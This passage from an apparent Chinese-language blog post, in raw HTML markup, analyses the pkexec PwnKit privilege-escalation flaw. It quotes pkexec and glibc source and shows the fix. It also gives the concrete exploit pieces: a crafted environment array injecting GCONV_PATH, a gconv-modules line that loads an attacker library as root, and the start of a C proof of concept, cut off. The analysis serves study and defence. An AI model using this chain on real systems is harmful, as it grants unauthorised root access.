&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * but do check this is the case.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * We also try to locate the program in the path if a non-absolute path is given.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">g_assert&lt;/span> (argv[argc] &lt;span style="color:#f92672">==&lt;/span> NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">g_strdup&lt;/span> (argv[n]);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而后如果&lt;code>envp[0]!='/'&lt;/code>则会通过&lt;code>g_find_program_in_path&lt;/code>在PATH环境变量内的目录中寻找第一个名字为path变量的可执行文件，并分配内存存储其绝对路径，没找到则会返回NULL。
再找到之后会将其写入到&lt;code>argv[n]&lt;/code>，前面说过当没有传入命令行参数时，n为1 &lt;code>argv[1]&lt;/code>指向&lt;code>envp[0]&lt;/code>，也就是我们可以通过控制执行pkexec的环境变量，在pkexec执行时注入环境变量。&lt;/p>
&lt;pre tabindex="0">&lt;code> if (path[0] != &amp;#39;/&amp;#39;)
{
/* g_find_program_in_path() is not suspectible to attacks via the environment */
s = g_find_program_in_path (path);
if (s == NULL)
{
g_printerr (&amp;#34;Cannot run program %s: %s\n&amp;#34;, path, strerror (ENOENT));
goto out;
}
g_free (path);
argv[n] = path = s;
}
&lt;/code>&lt;/pre>&lt;p>那为什么要绕这么大一圈来注入环境变量呢，直接在execve时通过envp参数注入呗。
在
&lt;a href="https://codebrowser.dev/glibc/glibc/elf/dl-support.c.html" target="_blank">glibc.so实现&lt;/a>中有如下代码：循环遍历unsecure_envvars，并且尝试调用unsetenv来取消该环境变量(如果有的话)。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (__libc_enable_secure)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> unsecure_envvars[] &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UNSECURE_ENVVARS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ifdef EXTRA_UNSECURE_ENVVARS
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> EXTRA_UNSECURE_ENVVARS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>cp &lt;span style="color:#f92672">=&lt;/span> unsecure_envvars;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (cp &lt;span style="color:#f92672">&amp;lt;&lt;/span> unsecure_envvars &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span> (unsecure_envvars))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">__unsetenv&lt;/span> (cp);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cp &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>) &lt;span style="color:#a6e22e">__rawmemchr&lt;/span> (cp, &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>unsecure_envvars定义在
&lt;a href="https://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html" target="_blank">https://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html&lt;/a>这些环境变量能够引入外部so，从而在执行程序的时候执行恶意代码，这在执行suid程序时是不安全的，所以glibc在初始化时就将这些环境变量去除了除非程序主动setenv。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define UNSECURE_ENVVARS \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;GCONV_PATH\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;GETCONF_DIR\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> GLIBC_TUNABLES_ENVVAR \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;HOSTALIASES\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_AUDIT\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_DEBUG\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_DEBUG_OUTPUT\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_DYNAMIC_WEAK\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_HWCAP_MASK\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_LIBRARY_PATH\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_ORIGIN_PATH\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_PRELOAD\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_PROFILE\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_SHOW_AUXV\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LD_USE_LOAD_BIAS\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LOCALDOMAIN\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;LOCPATH\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;MALLOC_TRACE\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;NIS_PATH\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;NLSPATH\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;RESOLV_HOST_CONF\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;RES_OPTIONS\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;TMPDIR\0&amp;#34; \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> &amp;#34;TZDIR\0&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如何触发加载，代码中有如下在循环中会遍历&lt;code>environment_variables_to_save&lt;/code>并获取对应的环境变量的值，传入到&lt;code>validate_environment_variable&lt;/code>函数中。
&lt;code>validate_environment_variable&lt;/code>函数会验证SHELL和XAUTHORITY环境变量是否合法，当SHELL环境变量不属于/etc/shells中的任意一个则会调用&lt;code>g_printerr&lt;/code>，或者XAUTHORITY环境变量中包含&lt;code>%&lt;/code>或&lt;code>..&lt;/code>也会调用g_printerr&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> gchar &lt;span style="color:#f92672">*&lt;/span>environment_variables_to_save[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SHELL&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LANG&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LINGUAS&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LANGUAGE&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LC_COLLATE&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LC_CTYPE&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LC_MESSAGES&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LC_MONETARY&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LC_NUMERIC&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LC_TIME&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;LC_ALL&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;TERM&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;COLORTERM&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;DISPLAY&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;XAUTHORITY&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NULL
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> };
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> saved_env &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">g_ptr_array_new&lt;/span> ();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; environment_variables_to_save[n] &lt;span style="color:#f92672">!=&lt;/span> NULL; n&lt;span style="color:#f92672">++&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> gchar &lt;span style="color:#f92672">*&lt;/span>key &lt;span style="color:#f92672">=&lt;/span> environment_variables_to_save[n];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> gchar &lt;span style="color:#f92672">*&lt;/span>value;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">g_getenv&lt;/span> (key);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (value &lt;span style="color:#f92672">==&lt;/span> NULL)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* To qualify for the paranoia goldstar - we validate the value of each
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * environment variable passed through - this is to attempt to avoid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * exploits in (potentially broken) programs launched via pkexec(1).
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">validate_environment_variable&lt;/span> (key, value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> out;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">g_ptr_array_add&lt;/span> (saved_env, &lt;span style="color:#a6e22e">g_strdup&lt;/span> (key));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">g_ptr_array_add&lt;/span> (saved_env, &lt;span style="color:#a6e22e">g_strdup&lt;/span> (value));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">validate_environment_variable&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> gchar &lt;span style="color:#f92672">*&lt;/span>key,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> gchar &lt;span style="color:#f92672">*&lt;/span>value)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gboolean ret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Generally we bail if any environment variable value contains
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * - &amp;#39;/&amp;#39; characters
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * - &amp;#39;%&amp;#39; characters
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * - &amp;#39;..&amp;#39; substrings
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">g_return_val_if_fail&lt;/span> (key &lt;span style="color:#f92672">!=&lt;/span> NULL, FALSE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">g_return_val_if_fail&lt;/span> (value &lt;span style="color:#f92672">!=&lt;/span> NULL, FALSE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> FALSE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* special case $SHELL */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">g_strcmp0&lt;/span> (key, &lt;span style="color:#e6db74">&amp;#34;SHELL&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* check if it&amp;#39;s in /etc/shells */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">is_valid_shell&lt;/span> (value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">log_message&lt;/span> (LOG_CRIT, TRUE,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;The value for the SHELL variable was not found the /etc/shells file&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">g_printerr&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;This incident has been reported.&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> out;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ((&lt;span style="color:#a6e22e">g_strcmp0&lt;/span> (key, &lt;span style="color:#e6db74">&amp;#34;XAUTHORITY&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">strstr&lt;/span> (value, &lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> NULL) &lt;span style="color:#f92672">||&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">strstr&lt;/span> (value, &lt;span style="color:#e6db74">&amp;#34;%&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> NULL &lt;span style="color:#f92672">||&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">strstr&lt;/span> (value, &lt;span style="color:#e6db74">&amp;#34;..&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> NULL)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">log_message&lt;/span> (LOG_CRIT, TRUE,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;The value for environment variable %s contains suscipious content&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> key);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">g_printerr&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;This incident has been reported.&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> out;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> TRUE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> out:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>/etc/shells&lt;/code>文件内容如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>➜ c cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/pwsh
/opt/microsoft/powershell/7/pwsh
/usr/bin/tmux
/usr/bin/screen
/bin/zsh
/usr/bin/zsh
/usr/bin/zsh
&lt;/code>&lt;/pre>&lt;p>&lt;strong>触发路径&lt;/strong>&lt;/p>
&lt;p>当CHARSET环境变量不是UTF-8时，g_printerr不能正确打印错误消息到stderr，为了将错误消息转化为其他字符集，g_printerr会调用iconv_open()，iconv_open()会执行共享库，并且读取默认配置文件/usr/lib/gconv/gconv-modules，当GCONV_PATH环境变量存在时，可以强制iconv_open()使用GCONV_PATH指向的目录中读取gconv-modules配置文件。&lt;/p>
&lt;p>因此利用可以构造如下环境变量，在通过execve启动时，pwnkit会传递给&lt;code>g_find_program_in_path&lt;/code>函数，尝试在PATH指向的目录中寻找名为pwnkit的可执行程序，此时会找到&lt;code>GCONV_PATH=./pwnkit&lt;/code>，并将其赋值给&lt;code>argv[1]&lt;/code>实际上是&lt;code>envp[0]&lt;/code>向pkexec注入了一个环境变量。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>env[] &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#e6db74">&amp;#34;pwnkit&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;PATH=GCONV_PATH=.&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;CHARSET=PWNKIT&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SHELL=pwnkit&amp;#34;&lt;/span>, NULL };
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而后由于CHARSET不是UTF-8，在SHELL触发g_printerr，g_printerr会调用iconv_open()函数，由于注入了环境变量GCONV_PATH，iconv_open函数会尝试在GCONV_PATH指向的目录，即./pwnkit目录下读取gconv-modules文件，此时./pwnkit/gconv-modules已经被覆盖为如下内容：&lt;/p>
&lt;pre tabindex="0">&lt;code>module UTF-8// PWNKIT// pwnkit 1
&lt;/code>&lt;/pre>&lt;p>这个配置文件指示iconv_open()，当尝试从UTF-8向PWNKIT转换时应该加载pwnkit.so，而CHARSET即目标字符集已经被设置为PWNKIT，所以会尝试加载pwnkit.so，只需要使我们的so在pwnkit/pwnkit.so目录即可使得pkexec以root权限加载我们的恶意so，达成提权。&lt;/p>
&lt;p>&lt;strong>漏洞修复&lt;/strong>&lt;/p>
&lt;p>前面分析知道触发漏洞需要argc=0，所以在程序启动时监测argc&amp;lt;1就直接退出了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (argc&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exit&lt;/span>(&lt;span style="color:#ae81ff">127&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>PoC&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>shell &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;#include &amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;#include &amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;#include &amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;void gconv() {}&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
